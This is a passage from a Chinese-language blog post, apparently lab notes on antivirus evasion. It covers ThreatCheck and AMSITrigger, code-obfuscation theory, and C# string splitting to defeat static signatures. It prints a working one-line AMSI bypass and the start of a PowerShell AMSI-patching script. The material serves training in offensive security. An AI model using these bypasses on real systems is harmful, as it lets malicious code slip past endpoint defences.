的一个分支，可以说是在这三者中使用最广泛&#x2F;最可靠的。为了识别可能的签名，ThreatCheck 对拆分的已编译二进制文件利用了多个防病毒引擎，并报告其认为存在可疑字节的位置。</p><p>下面是 ThreatCheck 的基本用法，只需要提供一个文件和一个扫描引擎就能用了。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\&gt;ThreatCheck.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">help</span></span><span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">e</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">engine</span><span style="color: #ABB2BF">    (</span><span style="color: #C678DD">Default</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">Defender</span><span style="color: #ABB2BF">) Scanning engine. Options: Defender,</span><span style="color: #E06C75"> AMSI</span></span><span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">      Analyze a file on disk</span></span><span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">       Analyze a file from a URL</span></span><span class="line"><span style="color: #ABB2BF">  --</span><span style="color: #E06C75">help</span><span style="color: #ABB2BF">          Display this help screen.</span></span><span class="line"><span style="color: #ABB2BF">  --</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">       Display version information.</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># Task </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">/4实际用法 题目要求用的是 Defender 但是会被 WD 干 所以用 AMSI</span></span><span class="line"><span style="color: #ABB2BF">.\ThreatCheck.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Student</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Binaries</span><span style="color: #ABB2BF">\shell.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">e</span><span style="color: #ABB2BF"> AMSI</span></span></code></pre></div></div></figure><h3 id="AMSITrigger"><a href="#AMSITrigger" class="headerlink" title="AMSITrigger"></a>AMSITrigger</h3><p>ThreatCheck 扫不了 PowerShell，但是这个工具可以</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\&gt;amsitrigger.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">help</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">inputfile</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">       Powershell filename</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">             URL eg. &lt;</span><span style="color: #E06C75">https</span><span style="color: #ABB2BF">://</span><span style="color: #D19A66">10.1.1.1</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">Invoke</span><span style="color: #ABB2BF">-NinjaCopy.</span><span style="color: #E06C75">ps1</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">format</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">          Output Format:</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Only</span><span style="color: #ABB2BF"> show Triggers</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> Triggers </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> Line numbers</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> Triggers inline </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> code</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> AMSI </span><span style="color: #E06C75">calls</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">xmas</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tree</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">mode</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">debug</span><span style="color: #ABB2BF">                 Show Debug Info</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">m</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">maxsiglength</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">    Maximum signature Length </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> cater </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #C678DD">default</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">2048</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">chunksize</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">       Chunk size </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> send </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> AMSIScanBuffer,</span></span><span class="line"><span style="color: #ABB2BF">                              </span><span style="color: #C678DD">default</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">4096</span></span><span class="line"><span style="color: #ABB2BF">-</span><span style="color: #E06C75">h</span><span style="color: #ABB2BF">, -?, --</span><span style="color: #E06C75">help</span><span style="color: #ABB2BF">              Show Help</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #ABB2BF"># 他会告诉你识别的字符串是什么，去把他改掉就行</span></span><span class="line"><span style="color: #ABB2BF"># -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> 使用 </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> 他会把恶意代码标红</span></span><span class="line"><span style="color: #ABB2BF">.\amsitrigger.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> bypass.</span><span style="color: #E06C75">ps1</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #ABB2BF">[+] </span><span style="color: #98C379">&quot;AmsiUtils&quot;</span></span><span class="line"><span style="color: #ABB2BF">[+] </span><span style="color: #98C379">&quot;amsiInitFailed&quot;</span></span></code></pre></div></div></figure><p>这里的 bypass.ps1 是上个房间让我们混淆用的</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">].Assembly.GetType(</span><span style="color: #98C379">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="color: #ABB2BF">).GetField(</span><span style="color: #98C379">&#39;amsiInitFailed&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;NonPublic,Static&#39;</span><span style="color: #ABB2BF">).SetValue(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><h2 id="Static-Code-Based-Signatures-基于静态代码的签名"><a href="#Static-Code-Based-Signatures-基于静态代码的签名" class="headerlink" title="Static Code-Based Signatures 基于静态代码的签名"></a>Static Code-Based Signatures 基于静态代码的签名</h2><p>现在我们鉴别出了有问题的签名，就要着手处理他了。在前面提到的论文中提到了很多在“混淆方法”和“混淆类别”层中有效的解决方案。</p><p><strong>Obfuscating methods 混淆方法</strong></p><table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>方法代理</td><td>创建一个代理方法或替换对象</td></tr><tr><td>方法分散&#x2F;聚合</td><td>将多种方法合并为一种，或将一种方法拆散成多个部分将多种方法合并为一种，或将一种方法拆散成多个部分</td></tr><tr><td>方法克隆</td><td>创建一个方法的副本并随机调用每个副本</td></tr></tbody></table><p>这三个都是代码混淆中常用的技术，目的是改变代码的结构，让逆向分析变得更困难。下面我来详细解释一下它们的实现方式和原理。</p><p><strong>1. 方法代理（Method Proxying）</strong></p><p><strong>目的</strong>：创建一个“代理”方法来代替原始方法，以此隐藏原始方法的直接调用关系。</p><p><strong>实现方式</strong>： 攻击者不会直接调用 <code>original_function()</code>，而是创建一个中间层——<code>proxy_function()</code>。<code>proxy_function()</code> 的唯一作用就是调用 <code>original_function()</code>。</p><p><strong>混淆原理</strong>： 对于静态分析工具来说，它只能看到对 <code>proxy_function()</code> 的调用，而无法直接看到对原始方法的调用。这使得分析师必须多走一步，先分析代理函数，才能找到真正的目标函数。在实际应用中，攻击者会创建大量毫无意义的代理函数，形成一个复杂的调用链，让分析师陷入“代理”的迷宫。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">// 原始调用</span></span><span class="line"><span style="color: #abb2bf">call original_function()</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">// 代理后的调用</span></span><span class="line"><span style="color: #abb2bf">call proxy_function_a()</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">proxy_function_a() {</span></span><span class="line"><span style="color: #abb2bf">    call proxy_function_b()</span></span><span class="line"><span style="color: #abb2bf">}</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">proxy_function_b() {</span></span><span class="line"><span style="color: #abb2bf">    call original_function()</span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure><hr><p><strong>2. 方法分散&#x2F;聚合（Method Scattering&#x2F;Aggregation）</strong></p><p>这个混淆方式有两种相反的操作，但目的都是为了打乱代码的组织结构。</p><ul><li><strong>方法分散（Scattering）</strong>：<ul><li><strong>目的</strong>：将一个完整的函数拆分成多个小的、不连续的代码块，并将它们分散在程序的各个角落。</li><li><strong>实现方式</strong>：攻击者会将一个函数 <code>original_function()</code> 拆分成 <code>original_function_part1</code>、<code>original_function_part2</code> 等。当程序执行时，它会通过复杂的跳转指令或函数调用，将这些分散的部分重新拼接起来执行。</li><li><strong>混淆原理</strong>：这破坏了代码的连续性。分析师无法通过简单地从上到下阅读代码来理解其功能。他们必须手动跟踪每一个跳转和调用，才能将所有代码块拼凑完整。</li></ul></li><li><strong>方法聚合（Aggregation）</strong>：<ul><li><strong>目的</strong>：将多个功能不相关的函数或代码块合并到一个巨大的函数中。</li><li><strong>实现方式</strong>：攻击者会将多个函数，比如 <code>download_file()</code> 和 <code>encrypt_data()</code>，合并成一个名为 <code>complex_function()</code> 的函数。</li><li><strong>混淆原理</strong>：这使得 <code>complex_function()</code> 变得非常庞大且难以理解。分析师必须在一大堆看似无关的代码中，找出并分离出那些真正执行恶意功能的代码，工作量呈指数级上升。</li></ul></li></ul><hr><p><strong>3. 方法克隆（Method Cloning）</strong></p><p><strong>目的</strong>：为同一个方法创建多个功能完全相同的副本，并随机调用这些副本。</p><p><strong>实现方式</strong>： 攻击者会为 <code>original_function()</code> 创建多个副本，例如 <code>original_function_clone1()</code>、<code>original_function_clone2()</code> 等。这些副本的内部代码可能完全相同，或者经过了轻微的混淆（比如改变了寄存器使用顺序）。在调用时，程序会随机选择一个副本进行调用。</p><p><strong>混淆原理</strong>： 当杀毒软件的静态签名引擎发现一个可疑的函数时，它会为这个函数建立一个签名。但如果存在成百上千个功能相同但字节码不同的克隆函数，杀毒软件就无法为它们一一建立签名。同时，这也使得分析师的工作变得重复且乏味，因为他们必须分析每一个克隆副本，才能确定其真实功能。</p><p><strong>Obfuscating Classes 混淆类</strong></p><table><thead><tr><th><strong>混淆方法</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>类层次扁平化</td><td>使用接口为类创建代理</td></tr><tr><td>类拆分&#x2F;合并</td><td>将局部变量或指令组转移到另一个类</td></tr><tr><td>删除修饰符</td><td>移除类修饰符（public、private），并将所有成员设置为 public</td></tr></tbody></table><p><strong>1. 类层次扁平化 (Class Hierarchy Flattening)</strong></p><ul><li><strong>目的</strong>: 移除复杂的继承关系，使所有类都看起来是独立的，隐藏它们之间的逻辑联系。</li><li><strong>实现原理</strong>: 攻击者会消除类之间的继承（<code>extends</code>）或接口实现（<code>implements</code>）关系。原始代码中，子类可能继承父类的多个方法和属性，但在混淆后，这些继承来的方法和属性会被直接复制到子类中。这样一来，复杂的类层次结构就会被“拍平”，变成一堆互不相干的独立类。</li><li><strong>混淆原理</strong>: 这种技术让分析师无法通过观察继承链来推断类的功能和关系。分析师必须单独检查每一个类，以确定其所有功能，工作量大大增加。</li></ul><hr><p><strong>2. 类拆分&#x2F;合并 (Class Splitting&#x2F;Merging)</strong></p><ul><li><strong>目的</strong>: 打乱类的内部结构，使代码的逻辑分散或集中，从而混淆分析。</li><li><strong>实现原理</strong>:<ul><li><strong>拆分 (Splitting)</strong>: 将一个类中的局部变量或方法，移动到另一个不相关的类中。例如，一个恶意类的关键数据或方法可能被拆分到多个不同的、看起来无害的类中。</li><li><strong>合并 (Merging)</strong>: 将多个类中的代码聚合到一个单一的、巨大的类中。这会使类变得异常庞大且难以理解。</li></ul></li><li><strong>混淆原理</strong>: 这种混淆技术破坏了面向对象编程的封装性。它使得分析师无法通过类的名字或功能来快速定位关键代码。如果一个类包含了太多无关的功能，或者一个功能被分散到多个类中，分析师就很难追踪完整的执行流程。</li></ul><hr><p><strong>3. 删除修饰符 (Modifier Removal)</strong></p><ul><li><strong>目的</strong>: 移除类和方法的修饰符（如 <code>public</code>、<code>private</code>），并把所有成员设为 <code>public</code>，以此来混淆代码的访问权限和结构。</li><li><strong>实现原理</strong>: 攻击者会修改代码，使所有类和方法的修饰符都被删除或替换为 <code>public</code>。例如，<code>private</code> 变量和 <code>protected</code> 方法都会被修改为 <code>public</code>。</li><li><strong>混淆原理</strong>: 这种做法破坏了面向对象编程的访问控制和封装原则。在正常的代码中，<code>private</code> 意味着这个方法或变量只能在类内部使用，这为分析师提供了重要的上下文线索。当所有成员都变为 <code>public</code> 后，分析师就无法通过访问权限来推断代码的内部逻辑，从而增加了分析的难度。</li></ul><h3 id="核心混淆思想的归纳"><a href="#核心混淆思想的归纳" class="headerlink" title="核心混淆思想的归纳"></a><strong>核心混淆思想的归纳</strong></h3><p><strong>1. 拆分与合并</strong></p><p>所有与“拆分”或“合并”相关的混淆技术，无论是<strong>类拆分&#x2F;聚合</strong>（<code>class splitting/coalescing</code>）还是<strong>方法分散&#x2F;聚合</strong>（<code>method scattering/aggregation</code>），它们的核心目的只有一个：<strong>打破代码的正常组织结构，使其难以被分析师追踪。</strong></p><ul><li><strong>实现原理</strong>：它们通过改变代码的“大小”和“位置”来制造混乱。一个原本逻辑清晰、封装良好的代码块（无论是类还是方法），会被拆得四分五裂或者被合并成一个臃肿的巨兽。</li><li><strong>最终目的</strong>：让分析师无法通过观察代码的常规结构（如类的边界、函数的开始与结束）来理解其功能。分析师必须耗费大量时间，手动将这些被分散的代码片段重新拼凑起来。</li></ul><p><strong>2. 隐藏和混淆可识别信息</strong></p><p>另一类混淆技术，包括<strong>删除修饰符</strong>（<code>dropping modifiers</code>）和<strong>方法克隆</strong>（<code>method clone</code>），其核心作用是：<strong>剥离或隐藏任何能为分析师提供线索的“元数据”。</strong></p><ul><li><strong>实现原理</strong>：这些方法不改变代码的逻辑，而是针对那些帮助人类理解代码的“标签”进行操作。<ul><li><strong>删除修饰符</strong>会移除像 <code>public</code>、<code>private</code> 这样的访问权限，破坏了面向对象编程的封装性，让分析师无法通过这些修饰符来推断代码的内部逻辑。</li><li><strong>方法克隆</strong>则通过制造大量功能相同但代码形式不同的副本，来规避基于签名的检测，并让分析师陷入无止境的重复分析。</li></ul></li><li><strong>最终目的</strong>：让恶意代码在静态分析阶段看起来毫无特征，并且不提供任何可供参考的“线索”，迫使分析师从零开始进行行为分析。</li></ul><h3 id="Splitting-and-Merging-Objects-拆分与合并对象"><a href="#Splitting-and-Merging-Objects-拆分与合并对象" class="headerlink" title="Splitting and Merging Objects 拆分与合并对象"></a>Splitting and Merging Objects 拆分与合并对象</h3><p>这个和之前拼接字符串很相似，在原理上是相等的，不过我们这里要操作的是一个字符串<strong>对象</strong>。尽管他是一个字符串，但是在面向对象语言里面万物皆对象。</p><p><strong>原会被检测的字符串</strong></p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@&quot;{{</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">GUID</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{0}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Type</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:{1},</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Meta</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{2},</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">IV</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{3}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">EncryptedMessage</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{4}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">HMAC</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{5}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">}}&quot;</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p><strong>混淆的方法</strong></p><p>通过构造一个字符串类来规避检测，这个只是能过静态，字符串的拼接是在运行时执行的，所以能绕过静态签名检测</p><figure class="shiki csharp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">GetMessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// Format the public method</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">get</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">// Return the property value</span></span><span class="line"><span style="color: #ABB2BF">    {</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">var</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">sb</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> new </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;{{</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">GUID</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{0}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// Start the built-in concatenation method</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Type</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:{1},&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">// Append substrings onto the string</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">Meta</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{2}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">IV</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{3}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">EncryptedMessage</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{4}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">,&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">Append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">@&quot;</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">HMAC</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">{5}</span><span style="color: #56B6C2">&quot;&quot;</span><span style="color: #98C379">}}&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sb</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">ToString</span><span style="color: #ABB2BF">(); </span><span style="color: #7F848E; font-style: italic">// Return the concatenated string to the class</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">string</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">MessageFormat</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">GetMessageFormat</span></span></code></pre></div></div></figure><h3 id="Removing-and-Obscuring-Identifiable-Information-删除和模糊可识别信息"><a href="#Removing-and-Obscuring-Identifiable-Information-删除和模糊可识别信息" class="headerlink" title="Removing and Obscuring Identifiable Information 删除和模糊可识别信息"></a>Removing and Obscuring Identifiable Information 删除和模糊可识别信息</h3><p>这个和之前用过的模糊变量名是一样的，下面是我处理好的 PowerShell 脚本，可以看到里面的变量名没变，处理过的是写死的字符串和数组，在运行时拼接。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern IntPtr GetModuleHandle(string lpModuleName);</span></span><span class="line"></span><span class="line"><span style="color: #98C379">    [DllImport(</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">kernel32</span><span style="color: #56B6C2">`&quot;</span><span style="color: #98C379">)]</span></span><span class="line"><span style="color: #98C379">    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span></span><span class="line"><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$Kernel32</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Add-Type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MemberDefinition </span><span style="color: #E06C75">$MethodDefinition</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&#39;Kernel32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NameSpace </span><span style="color: #98C379">&#39;Win32&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">PassThru;</span></span><span class="line"><span style="color: #E06C75">$A</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Ams&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: 